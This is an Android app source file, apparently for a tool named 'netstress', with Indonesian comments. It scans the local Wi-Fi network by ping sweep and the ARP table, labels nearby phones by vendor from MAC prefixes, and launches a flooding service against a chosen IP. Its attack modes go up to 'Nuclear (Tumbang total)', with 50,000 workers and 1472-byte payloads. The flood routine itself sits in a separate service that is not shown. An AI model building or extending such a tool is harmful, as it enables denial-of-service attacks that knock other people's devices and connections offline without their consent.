package com.netstress.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.FileReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import rikka.shizuku.Shizuku;

public class MainActivity extends AppCompatActivity {

    private static final int SHIZUKU_CODE = 1001;
    private static final int NOTIF_CODE = 1002;
    
    private Button btnShizuku, btnStart, btnStop, btnScan;
    private EditText etTargetIp;
    private TextView tvStatus;
    private Spinner spinnerIps, spinnerMode;
    private boolean hasShizukuPermission = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Minta izin notifikasi Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIF_CODE);
            }
        }

        btnShizuku = findViewById(R.id.btnShizuku);
        btnStart = findViewById(R.id.btnStart);
        btnStop = findViewById(R.id.btnStop);
        btnScan = findViewById(R.id.btnScan);
        etTargetIp = findViewById(R.id.etTargetIp);
        tvStatus = findViewById(R.id.tvStatus);
        spinnerIps = findViewById(R.id.spinnerIps);
        spinnerMode = findViewById(R.id.spinnerMode);

        // --- SETUP SPINNER MODE SERANGAN ---
        String[] modes = {
            "1. Santai (Aman)",
            "2. Sedang (Ping naik)",
            "3. Ganas (Lag parah)",
            "4. Brutal (Koneksi putus-nyambung)",
            "5. Nuclear (Tumbang total)"
        };
        ArrayAdapter<String> modeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, modes);
        modeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerMode.setAdapter(modeAdapter);
        spinnerMode.setSelection(2); // Default "Ganas"

        // --- SETUP SHIZUKU ---
        btnShizuku.setOnClickListener(v -> {
            if (!Shizuku.pingBinder()) {
                Toast.makeText(this, "Shizuku mati! Buka app Shizuku dulu.", Toast.LENGTH_LONG).show();
                return;
            }
            if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) {
                Shizuku.requestPermission(SHIZUKU_CODE);
            } else {
                activateFeature();
            }
        });

        Shizuku.addRequestPermissionResultListener((requestCode, grantResult) -> {
            if (requestCode == SHIZUKU_CODE && grantResult == PackageManager.PERMISSION_GRANTED) {
                activateFeature();
            }
        });

        // --- FITUR SCAN JARINGAN ---
        btnScan.setOnClickListener(v -> {
            if (!hasShizukuPermission) {
                Toast.makeText(this, "Aktifkan Shizuku dulu!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            tvStatus.setText("SCANNING NETWORK...");
            tvStatus.setTextColor(0xFFFFFF00); // Kuning
            btnScan.setEnabled(false);

            new Thread(() -> {
                List<String> ips = scanNetwork();
                
                runOnUiThread(() -> {
                    btnScan.setEnabled(true);
                    tvStatus.setText("SYSTEM READY");
                    tvStatus.setTextColor(0xFF00FFCC); // Cyan

                    if (ips.isEmpty()) {
                        Toast.makeText(this, "Tidak ada perangkat ditemukan. Coba lagi.", Toast.LENGTH_SHORT).show();
                    } else {
                        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, ips);
                        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
                        spinnerIps.setAdapter(adapter);
                        Toast.makeText(this, ips.size() + " perangkat ditemukan!", Toast.LENGTH_SHORT).show();
                    }
                });
            }).start();
        });

        // --- TOMBOL MULAI STRIKE ---
        btnStart.setOnClickListener(v -> {
            String ip = "";
            if (spinnerIps.getSelectedItem() != null) {
                String selected = spinnerIps.getSelectedItem().toString();
                ip = selected.split(" ")[0]; 
            } else {
                ip = etTargetIp.getText().toString().trim();
            }

            if (ip.isEmpty()) {
                Toast.makeText(this, "Pilih atau masukkan IP target!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (!hasShizukuPermission) {
                Toast.makeText(this, "Klik 'Aktifkan Fitur' dulu!", Toast.LENGTH_SHORT).show();
                return;
            }

            // Ambil mode serangan
            int modePosition = spinnerMode.getSelectedItemPosition();
            int workers = 10000, payload = 1024;
            
            if (modePosition == 0) { workers = 1000; payload = 128; }
            else if (modePosition == 1) { workers = 5000; payload = 512; }
            else if (modePosition == 2) { workers = 10000; payload = 1024; }
            else if (modePosition == 3) { workers = 20000; payload = 1472; }
            else if (modePosition == 4) { workers = 50000; payload = 1472; }

            Intent intent = new Intent(this, StressService.class);
            intent.putExtra("TARGET_IP", ip);
            intent.putExtra("WORKERS", workers);
            intent.putExtra("PAYLOAD", payload);
            
            ContextCompat.startForegroundService(this, intent);
            
            tvStatus.setText("STRIKING " + ip);
            tvStatus.setTextColor(0xFF00FFCC);
            btnStart.setEnabled(false);
            btnStop.setEnabled(true);
        });

        // --- TOMBOL STOP ---
        btnStop.setOnClickListener(v -> {
            stopService(new Intent(this, StressService.class));
            tvStatus.setText("SYSTEM READY");
            tvStatus.setTextColor(0xFF33FF33);
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
        });
    }

    private void activateFeature() {
        hasShizukuPermission = true;
        btnShizuku.setText("FITUR AKTIF ✓");
        btnShizuku.setBackgroundTintList(android.content.res.ColorStateList.valueOf(0xFF33FF33));
        Toast.makeText(this, "Akses Shizuku Diberikan!", Toast.LENGTH_SHORT).show();
    }

    // --- LOGIKA SCAN JARINGAN (PING SWEEP + ARP) ---
    private List<String> scanNetwork() {
        List<String> ipList = new ArrayList<>();
        
        // 1. Pancingan ping biar tabel ARP keisi
        pingSweep();

        // 2. Baca tabel ARP
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/net/arp"));
            String line;
            br.readLine(); // Skip header
            
            while ((line = br.readLine()) != null) {
                String[] tokens = line.split("\\s+");
                if (tokens.length >= 4) {
                    String ip = tokens[0];
                    String mac = tokens[3];
                    String flags = tokens[2];
                    
                    // Hanya ambil yang statusnya aktif (0x2)
                    if (flags.equals("0x2") && isValidIp(ip)) {
                        String macPrefix = mac.length() >= 8 ? mac.substring(0, 8).toLowerCase() : "00:00:";
                        String vendor = getVendorFromMac(macPrefix);
                        
                        String displayText = ip;
                        if (!vendor.equals("Unknown")) {
                            displayText += "  [" + vendor + "]";
                        }
                        
                        boolean exists = false;
                        for(String s : ipList) { if(s.startsWith(ip)) exists = true; }
                        if(!exists) ipList.add(displayText);
                    }
                }
            }
            br.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ipList;
    }

    private void pingSweep() {
        try {
            // Cari IP base dari network interface HP
            String myIp = "192.168.1"; // Default fallback
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface ni = interfaces.nextElement();
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        String ip = addr.getHostAddress();
                        if (ip.startsWith("192.168.") || ip.startsWith("10.")) {
                            String[] parts = ip.split("\\.");
                            myIp = parts[0] + "." + parts[1] + "." + parts[2];
                        }
                    }
                }
            }

            // Ping 254 IP secara paralel (Thread)
            for (int i = 1; i < 255; i++) {
                final String targetIp = myIp + "." + i;
                new Thread(() -> {
                    try {
                        Process p = Runtime.getRuntime().exec("ping -c 1 -W 1 " + targetIp);
                        p.waitFor();
                    } catch (Exception ignored) {}
                }).start();
            }
            
            // Tunggu 1.5 detik biar HP lain ngebales
            Thread.sleep(1500);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // --- LOGIKA DETEKSI MERK HP DARI MAC ADDRESS ---
    private String getVendorFromMac(String macPrefix) {
        switch (macPrefix) {
            case "3c:5a:": case "64:cc:": case "50:8f:": case "28:6c:": case "78:11:": return "Xiaomi/Redmi";
            case "a4:50:": case "8c:77:": case "34:23:": case "5c:0a:": return "Samsung";
            case "f0:18:": case "3c:2e:": case "9c:35:": return "Apple/iPhone";
            case "00:1a:": case "2c:54:": case "00:9a:": case "00:0c:": return "Huawei";
            case "d4:6a:": case "c0:ee:": case "10:7b:": case "2c:8a:": return "Oppo";
            case "00:ae:": case "00:9e:": case "d0:65:": return "Vivo";
            case "00:1e:": case "00:26:": case "b0:be:": return "Asus";
            case "d8:3a:": case "c0:3f:": case "e0:2c:": return "TP-Link";
            case "00:e0:": case "00:11:": return "Router/Gateway";
            default: return "Unknown";
        }
    }

    private boolean isValidIp(String ip) {
        String[] parts = ip.split("\\.");
        if (parts.length != 4) return false;
        for (String part : parts) {
            try {
                int num = Integer.parseInt(part);
                if (num < 0 || num > 255) return false;
            } catch (NumberFormatException e) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == SHIZUKU_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                activateFeature();
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
